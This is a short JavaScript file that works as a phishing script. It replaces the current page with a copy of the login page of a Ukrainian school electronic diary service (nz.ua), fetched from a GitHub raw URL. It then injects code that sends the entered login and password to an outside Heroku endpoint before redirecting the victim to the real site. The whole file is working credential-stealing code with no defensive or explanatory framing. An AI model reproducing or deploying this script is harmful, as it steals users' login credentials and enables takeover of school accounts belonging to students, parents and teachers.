let btn = document.getElementById('form-button');
let fform = document.getElementById('login-form')
let l = document.getElementById('loginform-login')
let p = document.getElementById('loginform-password')
const url = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';

function g(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
function createMyScript() {
    let script = document.createElement('script')
    script.innerHTML = `function post(url, data) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            window.location.href = nextUrl;
        }
      }
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', null);
    xhr.send(JSON.stringify(data));
}
function getNextUrl() {
    let url = new URL(window.location.href);
    let next = url.searchParams.get('next');
    return next ? next : 'https://nz.ua/menu/'
}
const nextUrl = getNextUrl()

btn.addEventListener('click', () => {
    post(url, {l: l.value, p: p.value});
});`;
    return script
}
let html = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html')
document.documentElement.innerHTML = html
window.history.pushState({"html": html,"pageTitle":"Нові знання - Вхід на сайт - Електронні щоденники та журнали з можливостями дистанційного навчання/ Электронные дневники и журналы"}, "", "/")
document.body.appendChild( createMyScript() )